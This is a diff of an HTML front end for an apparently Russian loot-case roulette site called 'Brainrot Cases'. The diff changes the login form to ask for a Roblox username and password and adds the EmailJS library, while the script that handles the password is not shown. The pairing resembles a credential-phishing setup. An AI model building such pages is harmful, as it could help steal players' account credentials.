@@ -2,70 +2,78 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Magic Cases | Premium</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Brainrot Cases - LIVE</title>
     <link rel="stylesheet" href="style.css">
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
 </head>
 <body>
 
     <div id="notification-container"></div>
 
-    <div class="live-header">
+    <header class="live-header">
         <div class="live-status">
-            <div class="live-title">LIVE</div>
-            <div class="live-indicator"><div class="dot"></div></div>
+            <span class="dot"></span>
+            <span class="live-label">LIVE DROPS</span>
         </div>
-        <div class="drop-tape" id="global-live-feed"></div>
-    </div>
-
-    <div id="auth-screen" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #05050a; z-index: 10000; display: flex; align-items: center; justify-content: center;">
-        <div class="auth-card" style="background: #0f0f1e; padding: 30px; border-radius: 20px; border: 1px solid #2a2a45; width: 90%; max-width: 400px; text-align: center;">
-            <div class="auth-tabs" style="display: flex; gap: 10px; margin-bottom: 20px;">
-                <button id="tab-btn-login" class="neon-btn active" onclick="switchAuthMode('login')" style="flex:1">ВХОД</button>
-                <button id="tab-btn-reg" class="neon-btn" onclick="switchAuthMode('reg')" style="flex:1">РЕГА</button>
+        <div id="global-live-feed" class="drop-tape">
             </div>
-            <input type="text" id="user_name" placeholder="Никнейм">
-            <input type="password" id="user_password" placeholder="Пароль">
-            <button id="btn-login-action" class="neon-btn" onclick="login()">ВОЙТИ</button>
-            <button id="btn-reg-action" class="neon-btn" style="display:none;" onclick="register()">СОЗДАТЬ</button>
+    </header>
+
+    <div id="auth-screen" class="full-screen">
+        <div class="auth-card">
+            <div class="auth-tabs">
+                <button id="tab-btn-login" class="active" onclick="switchAuthMode('login')">ВХОД</button>
+                <button id="tab-btn-reg" onclick="switchAuthMode('reg')">РЕГИСТРАЦИЯ</button>
+            </div>
+
+            <div class="auth-form">
+                <input type="text" id="user_name" placeholder="Roblox Username">
+                <input type="password" id="user_password" placeholder="Пароль (от 8 символов)">
+    
+                <button id="btn-login-action" class="neon-btn" onclick="login()">ВОЙТИ</button>
+                <button id="btn-reg-action" class="neon-btn" onclick="register()" style="display:none;">СОЗДАТЬ АККАУНТ</button>
+            </div>
         </div>
     </div>
 
-    <div id="game-interface" style="display:none; position: relative; z-index: 100;">
+    <main id="game-interface" style="display:none;">
         
-        <div id="page-cases" class="page active">
+        <section id="page-cases" class="page active">
             <div id="cases-grid"></div>
-        </div>
-        
-        <div id="page-opening" class="page">
-            <div class="roulette-container">
-                <div class="roulette-wrapper">
-                    <div class="tape" id="roulette-tape"></div>
-                </div>
-                <div id="win-display" style="display:none; text-align: center; margin-top: 20px;">
-                    <h2 id="win-name-text" style="color:#00d4ff; margin-bottom: 20px;"></h2>
-                    <button class="neon-btn" style="width: 220px; margin: 0 auto;" onclick="navTo('cases')">ВЕРНУТЬСЯ</button>
-                </div>
-            </div>
-        </div>
+        </section>
 
-        <div id="page-profile" class="page">
-            <div class="profile-info" style="text-align:center; margin-bottom: 30px;">
-                <h2 id="p-username" style="color:#00d4ff;"></h2>
-                <p style="color:#2ecc71; font-size: 20px; font-weight: bold;">$ <span id="p-balance">0</span></p>
+        <section id="page-opening" class="page">
+            <div class="roulette-wrapper">
+                <div class="selector"></div>
+                <div id="roulette-tape" class="tape"></div>
             </div>
+            <div id="win-display" style="display:none; text-align:center; margin-top:20px;">
+                <h2 id="win-name-text"></h2>
+                <button class="neon-btn" style="width: 200px;" onclick="navTo('cases')">ЗАБРАТЬ</button>
+            </div>
+        </section>
+
+        <section id="page-profile" class="page">
+            <div class="balance-display">БАЛАНС: <span id="p-balance">0</span>$</div>
             <div id="inventory-list"></div>
-        </div>
+        </section>
 
         <nav class="bottom-navbar">
-            <button id="nav-cases" onclick="navTo('cases')">КЕЙСЫ</button>
-            <button id="nav-profile" onclick="navTo('profile')">ПРОФИЛЬ</button>
-            <button onclick="logout()" style="color:#ff4444;">ВЫХОД</button>
+            <button onclick="navTo('cases')">КЕЙСЫ</button>
+            <button onclick="navTo('profile')">ПРОФИЛЬ</button>
+            <button onclick="logout()" class="exit-link">ВЫХОД</button>
         </nav>
-    </div>
+    </main>
 
-    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
     <script src="script.js"></script>
+
+    <div id="cookie-banner">
+    <h3>🍪 Используем Cookie</h3>
+    <p>Чтобы не входить постоянно при перезагрузке сайта, нам нужно разрешение на использование локального хранилища.</p>
+    <button class="neon-btn" onclick="acceptCookies()">ПРИНЯТЬ И ИГРАТЬ</button>
+</div>
+    
 </body>
 </html>
